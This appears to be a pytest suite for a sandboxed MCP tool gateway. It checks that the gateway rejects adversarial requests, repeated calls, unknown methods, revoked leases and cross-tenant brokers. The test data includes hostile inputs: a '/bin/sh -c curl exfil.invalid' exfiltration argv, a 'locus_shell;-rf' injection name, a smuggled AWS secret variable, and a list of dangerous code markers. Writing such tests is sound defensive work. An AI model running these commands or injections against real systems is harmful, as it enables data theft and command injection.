"""LOCUS-416: adversarial MCP request -> real pod receipt/PEP/broker tests.

The Docker process is stubbed as in the baseline pod broker tests; these do
not constitute a real Docker Engine, Unix-socket transport, or OpenCode smoke.
"""
from __future__ import annotations

import concurrent.futures
import json
import subprocess
from pathlib import Path

import pytest

from locus_runtime import pod_sandbox_broker as broker_module
from locus_runtime.action_receipts import PodActionReceipts
from locus_runtime.harness.pod_mcp_supervisor import (
    PodMcpContractDenied, TrustedPodMcpHandler, _action_key,
)
from locus_runtime.pod_reservations import PodReservationLedger
from locus_runtime.pod_tool_broker import SandboxedPodToolBroker
from tests.gateway_support import FakeEngine
from tests.unit.test_pod_tool_broker import setup


def msg(method, request_id="request-1", params=None):
    return {
        "jsonrpc": "2.0", "id": request_id, "method": method,
        "params": {} if params is None else params,
    }


def invoke(name="locus_fixed_tool", ident="request-1", arguments=None):
    return msg(
        "tools/call", ident,
        {"name": name, "arguments": {} if arguments is None else arguments},
    )


def ready(tmp_path, monkeypatch, *, engine=None):
    broker, receipts, lease, parent, _, calls = setup(
        tmp_path, monkeypatch, engine=engine,
    )
    endpoint = TrustedPodMcpHandler(
        lease, broker, exposed_tools=("locus_fixed_tool",),
    )
    return endpoint, receipts, lease, parent, broker, calls


def test_mcp_initialize_and_list_exact_admitted_tools(tmp_path, monkeypatch):
    endpoint, _, _, _, _, calls = ready(tmp_path, monkeypatch)
    intro = endpoint.handle(msg("initialize", "init-1", {
        "protocolVersion": "2025-03-26", "capabilities": {},
        "clientInfo": {"name": "untrusted-engine"},
    }))
    assert intro["result"]["serverInfo"]["name"] == "locus-pod-gateway"
    assert endpoint.handle(msg("ping", 0))["result"] == {}
    listed = endpoint.handle(msg("tools/list", "list-1"))
    assert listed["result"]["tools"] == [{
        "name": "locus_fixed_tool",
        "description": "Administrator-registered, Gateway-fenced Locus action",
        "inputSchema": {
            "type": "object", "properties": {},
            "additionalProperties": False,
        },
    }]
    assert not calls
    assert endpoint.handle({
        "jsonrpc": "2.0", "method": "notifications/initialized"
    }) is None


def test_receipted_mcp_tool_uses_exact_registered_sandbox_and_no_raw_output(tmp_path, monkeypatch):
    endpoint, receipts, lease, parent, _, calls = ready(tmp_path, monkeypatch)
    response = endpoint.handle(invoke())
    assert "result" in response
    assert response["result"]["isError"] is False
    text = response["result"]["content"][0]["text"]
    status = json.loads(text)
    assert status["schema"] == "status/v1"
    assert status["ok"] is True and status["code"] == 0
    assert len(status["digest"]) == 64
    assert len(calls) == 1
    command, opts = calls[0]
    assert command[:3] == ["docker", "run", "--rm"]
    assert "--network=none" in command and "--read-only" in command
    assert opts["shell"] is False
    assert opts["stdout"] is subprocess.DEVNULL
    assert opts["stderr"] is subprocess.DEVNULL
    with receipts.reservations._connect() as db:
        rows = db.execute("SELECT * FROM pod_action_receipt").fetchall()
        assert len(rows) == 1
        assert rows[0]["state"] == "succeeded"
        assert rows[0]["idempotency_key"] == _action_key(lease, "request-1")
    assert "approved_tool" not in str(response)
    assert parent.caller.token not in str(response)
    assert lease._session.caller.token not in str(response)


def test_mcp_same_request_id_cannot_repeat_effect_or_change_action(tmp_path, monkeypatch):
    endpoint, _, lease, _, _, calls = ready(tmp_path, monkeypatch)
    a = endpoint.handle(invoke())
    b = endpoint.handle(invoke())
    assert "result" in a
    assert b["error"]["code"] == -32002
    assert len(calls) == 1
    assert _action_key(lease, 1) != _action_key(lease, "1")
    assert _action_key(lease, "request-1") == _action_key(lease, "request-1")


def test_mcp_new_id_is_new_bounded_intent_not_an_unlimited_retry(tmp_path, monkeypatch):
    endpoint, receipts, _, _, _, calls = ready(tmp_path, monkeypatch)
    for i in range(4):
        assert "result" in endpoint.handle(invoke(ident=f"unique-{i}"))
    denied = endpoint.handle(invoke(ident="unique-5"))
    assert denied["error"]["code"] == -32002
    assert len(calls) == 4
    with receipts.reservations._connect() as db:
        assert db.execute("SELECT count(*) FROM pod_action_receipt").fetchone()[0] == 4


@pytest.mark.parametrize("arguments", [
    {"argv": ["/bin/sh", "-c", "curl exfil.invalid"]},
    {"cwd": "/root"},
    {"timeout": 999999},
    {"idempotency_key": "not-the-authorized-id"},
    {"shell": True},
    {"tool": "fixed_tool"},
    {"data": {"nested": ["untrusted"]}},
    ["not-an-object"],
    "bogus",
])
def test_extra_tool_payload_cannot_smuggle_argv_or_execution_settings(
    tmp_path, monkeypatch, arguments,
):
    endpoint, receipts, _, _, _, calls = ready(tmp_path, monkeypatch)
    response = endpoint.handle(invoke(arguments=arguments))
    assert response["error"]["code"] == -32602
    assert calls == []
    with receipts.reservations._connect() as db:
        assert db.execute("SELECT count(*) FROM pod_action_receipt").fetchone()[0] == 0


@pytest.mark.parametrize("method", [
    "initialize/rpc", "resources/read", "prompts/get",
    "completion/complete", "tools/subscribe", "shell", "http",
])
def test_methods_outside_registered_mcp_surface_denied(tmp_path, monkeypatch, method):
    endpoint, _, _, _, _, calls = ready(tmp_path, monkeypatch)
    assert endpoint.handle(msg(method))["error"]["code"] == -32601
    assert not calls


@pytest.mark.parametrize("invalid", [
    None, 0, True, False, "", "../unsafe", "line\nnewline",
    "a" * 97, [], {}, 1.1, -1,
])
def test_invalid_request_ids_denied_before_action(tmp_path, monkeypatch, invalid):
    endpoint, _, _, _, _, calls = ready(tmp_path, monkeypatch)
    response = endpoint.handle(invoke(ident=invalid))
    assert response["error"]["code"] == -32600
    assert calls == []


def test_unknown_tool_and_protocol_injection_have_no_receipt(tmp_path, monkeypatch):
    endpoint, receipts, _, _, _, calls = ready(tmp_path, monkeypatch)
    attacks = [
        invoke(name="locus_shell"),
        invoke(name="locus_execute_bash"),
        msg("tools/list", params={"cursor": "elsewhere"}),
        {**msg("tools/call", params={
            "name": "locus_fixed_tool", "arguments": {},
        }), "env": {"AWS_SECRET_ACCESS_KEY": "stolen"}},
        {**msg("tools/list"), "jsonrpc": "1.0"},
        msg("initialize", params={"protocolVersion": "9999-01-01"}),
        msg("tools/list", params={"hello": float("nan")}),
    ]
    for request in attacks:
        assert "error" in endpoint.handle(request)
    assert calls == []
    with receipts.reservations._connect() as db:
        assert db.execute("SELECT count(*) FROM pod_action_receipt").fetchone()[0] == 0


def test_denied_gateway_policy_does_not_dispatch_mcp(tmp_path, monkeypatch):
    endpoint, receipts, _, _, _, calls = ready(
        tmp_path, monkeypatch, engine=FakeEngine(allow={"agent_policy": False}),
    )
    response = endpoint.handle(invoke())
    assert response["error"]["code"] == -32002
    assert not calls
    with receipts.reservations._connect() as db:
        assert db.execute("SELECT count(*) FROM pod_action_receipt").fetchone()[0] == 0


def test_revocation_makes_tool_catalog_and_execution_inaccessible(tmp_path, monkeypatch):
    endpoint, receipts, _, parent, _, calls = ready(tmp_path, monkeypatch)
    receipts.reservations.revoke_parent(parent)
    assert endpoint.handle(msg("tools/list"))["error"]["code"] == -32001
    assert endpoint.handle(invoke())["error"]["code"] == -32001
    assert not calls


def test_foreign_or_unregistered_child_catalog_cannot_expose_tools(tmp_path, monkeypatch):
    broker, _, lease, _, _, calls = setup(tmp_path, monkeypatch)
    with pytest.raises(PodMcpContractDenied, match="grant exceeds"):
        TrustedPodMcpHandler(
            lease, broker, exposed_tools=("locus_execute_bash",),
        )
    with pytest.raises(PodMcpContractDenied):
        TrustedPodMcpHandler(lease, broker, exposed_tools=())
    with pytest.raises(PodMcpContractDenied):
        TrustedPodMcpHandler(
            lease, broker,
            exposed_tools=("locus_fixed_tool", "locus_fixed_tool"),
        )
    with pytest.raises(PodMcpContractDenied):
        TrustedPodMcpHandler(
            lease, broker, exposed_tools=("locus_shell;-rf",),
        )
    assert calls == []


def test_competing_same_id_mcp_calls_dispatch_exactly_once(tmp_path, monkeypatch):
    endpoint, receipts, _, _, _, calls = ready(tmp_path, monkeypatch)
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as pool:
        futures = [pool.submit(endpoint.handle, invoke()) for _ in range(10)]
        results = [f.result() for f in futures]
    assert sum("result" in result for result in results) == 1
    assert sum("error" in result for result in results) == 9
    assert len(calls) == 1
    with receipts.reservations._connect() as db:
        assert db.execute("SELECT count(*) FROM pod_action_receipt").fetchone()[0] == 1


def test_durable_receipts_reject_retry_after_new_supervisor_broker_object(tmp_path, monkeypatch):
    endpoint, receipts, lease, parent, broker, calls = ready(tmp_path, monkeypatch)
    assert "result" in endpoint.handle(invoke(ident="durable-1"))
    reopened_ledger = PodReservationLedger(tmp_path / "pods.db")
    reopened_receipts = PodActionReceipts(reopened_ledger, supervisor=parent)
    fresh_broker = SandboxedPodToolBroker(
        reopened_receipts,
        {"fixed_tool": broker._tools["fixed_tool"]},
    )
    reopened_endpoint = TrustedPodMcpHandler(
        lease, fresh_broker, exposed_tools=("locus_fixed_tool",),
    )
    retry = reopened_endpoint.handle(invoke(ident="durable-1"))
    assert retry["error"]["code"] == -32002
    assert len(calls) == 1


def test_failed_sandbox_backend_message_is_redacted_and_receipt_uncertain(tmp_path, monkeypatch):
    endpoint, receipts, _, _, _, calls = ready(tmp_path, monkeypatch)
    def corrupt_runner(argv, **kwargs):
        calls.append((argv, kwargs))
        raise RuntimeError("private-token=do-not-expose")
    monkeypatch.setattr(broker_module.subprocess, "run", corrupt_runner)
    result = endpoint.handle(invoke(ident="failing"))
    assert "error" in result and "do-not-expose" not in str(result)
    assert result["error"]["code"] == -32003
    assert len(calls) == 1
    with receipts.reservations._connect() as db:
        states = [
            row["state"]
            for row in db.execute("SELECT state FROM pod_action_receipt")
        ]
        assert len(states) == 1
        assert states[0] in {"uncertain", "dispatching"}


def test_mcp_endpoint_has_no_local_subprocess_or_second_gateway():
    source = (
        Path(__file__).resolve().parents[2] /
        "locus_runtime/harness/pod_mcp_supervisor.py"
    ).read_text(encoding="utf-8")
    for marker in (
        "subprocess.run(", "subprocess.Popen(", "Gateway(",
        "Gateway.open_session(", "os.system(", "shell=True",
        "exec(", "eval(", "socket.", "httpx.",
    ):
        assert marker not in source



def test_foreign_parent_or_different_ledger_broker_cannot_disclose_mcp_catalog(
    tmp_path, monkeypatch,
):
    first = tmp_path / "tenant-a"
    second = tmp_path / "tenant-b"
    first.mkdir()
    second.mkdir()
    a_broker, a_receipts, a_lease, _, _, a_calls = setup(first, monkeypatch)
    b_broker, b_receipts, b_lease, _, _, b_calls = setup(second, monkeypatch)
    with pytest.raises(PodMcpContractDenied, match="foreign MCP receipt supervisor"):
        TrustedPodMcpHandler(
            a_lease, b_broker, exposed_tools=("locus_fixed_tool",),
        )
    with pytest.raises(PodMcpContractDenied, match="foreign MCP receipt supervisor"):
        TrustedPodMcpHandler(
            b_lease, a_broker, exposed_tools=("locus_fixed_tool",),
        )
    assert not a_calls and not b_calls
    for receipts in (a_receipts, b_receipts):
        with receipts.reservations._connect() as db:
            assert db.execute(
                "SELECT count(*) FROM pod_action_receipt"
            ).fetchone()[0] == 0
